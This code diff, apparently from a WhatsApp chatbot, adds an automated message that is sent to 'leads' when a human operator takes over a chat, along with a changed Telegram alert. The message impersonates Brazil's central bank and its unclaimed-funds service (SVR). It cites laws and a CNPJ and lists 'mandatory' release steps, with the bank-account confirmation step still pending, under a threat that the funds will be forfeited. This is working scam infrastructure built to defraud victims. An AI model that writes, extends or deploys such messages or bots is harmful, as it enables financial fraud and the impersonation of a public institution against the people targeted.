@@ -268,6 +268,42 @@ client.on('disconnected', (reason) => {
 // admin digita manualmente e assume o atendimento de um lead.
 // NÃO processa mensagens recebidas aqui para evitar confusão.
 // =============================================================
+
+// Mensagem formal enviada automaticamente quando o operador assume
+const MENSAGEM_OPERADOR_ASSUME = `🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
+*Departamento de Liberação de Ativos Financeiros*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Prezado(a) Titular,
+
+Informamos que a partir deste momento o(a) senhor(a) está sendo atendido(a) diretamente por um *Operador Especializado do Departamento Jurídico-Financeiro* do Portal SVR, vinculado ao Banco Central do Brasil, em conformidade com a *Lei Complementar nº 105/2001* e a *Resolução BCB nº 4.862/2020*.
+
+Seu processo de liberação de ativos financeiros pendentes encontra-se devidamente registrado em nosso sistema federal e aguarda a conclusão das etapas obrigatórias de validação, conforme previsto na legislação vigente.
+
+📋 *ETAPAS OBRIGATÓRIAS PARA LIBERAÇÃO:*
+
+*1ª Etapa — Autenticação de Identidade:* ✅ Concluída
+Validação dos dados cadastrais do titular perante os registros do Banco Central do Brasil.
+
+*2ª Etapa — Validação Jurídica do Processo:* 🔄 Em andamento
+Análise e homologação do pedido de resgate junto ao Departamento de Ativos Não Reclamados.
+
+*3ª Etapa — Confirmação do Canal de Recebimento:* ⏳ Pendente
+Verificação e habilitação da conta de destino para transferência dos valores resgatados.
+
+*4ª Etapa — Liberação e Transferência dos Valores:* ⏳ Pendente
+Processamento final e crédito dos ativos financeiros na conta indicada pelo titular.
+
+⚠️ *IMPORTANTE:* Todas as etapas são *obrigatórias e insubstituíveis*, conforme determina o protocolo de segurança do Sistema de Valores a Receber (SVR). A não conclusão de qualquer etapa *suspende automaticamente* o processo de resgate, podendo resultar no retorno dos valores ao Fundo Garantidor.
+
+Nosso operador responsável conduzirá o(a) senhor(a) pelas próximas etapas de forma segura, sigilosa e dentro dos prazos legalmente estabelecidos.
+
+_Contamos com sua colaboração e compreensão._
+
+*Portal SVR — Banco Central do Brasil*
+*CNPJ: 00.038.166/0001-05*
+_Este canal é monitorado e possui validade jurídica._`;
+
 client.on('message_create', async (msg) => {
     if (BOT_ID !== 'main') return;
     // Só nos interessa quando o admin (nós mesmos) envia manualmente
@@ -286,7 +322,17 @@ client.on('message_create', async (msg) => {
         chatSessions.set(targetChatId, { mode: 'human' });
         saveSessions();
         console.log(`👤 [ADMIN] Assumiu atendimento de: ${targetChatId}`);
-        notifyTelegram(`👤 <b>ATENDIMENTO ASSUMIDO PELO ADMIN</b>\nLead: <code>${targetChatId}</code>\n<i>O bot foi desativado para este contato.</i>`);
+        notifyTelegram(`👤 <b>ATENDIMENTO ASSUMIDO PELO ADMIN</b>\nLead: <code>${targetChatId}</code>\n<i>Mensagem formal enviada ao lead automaticamente.</i>`);
+
+        // Envia a mensagem formal ao lead ANTES de silenciar o bot
+        setTimeout(async () => {
+            try {
+                await client.sendMessage(targetChatId, MENSAGEM_OPERADOR_ASSUME);
+                console.log(`📨 [ADMIN] Mensagem formal enviada ao lead: ${targetChatId}`);
+            } catch (e) {
+                console.error(`❌ [ADMIN] Erro ao enviar mensagem formal:`, e.message);
+            }
+        }, 1500);
     }
 });
 
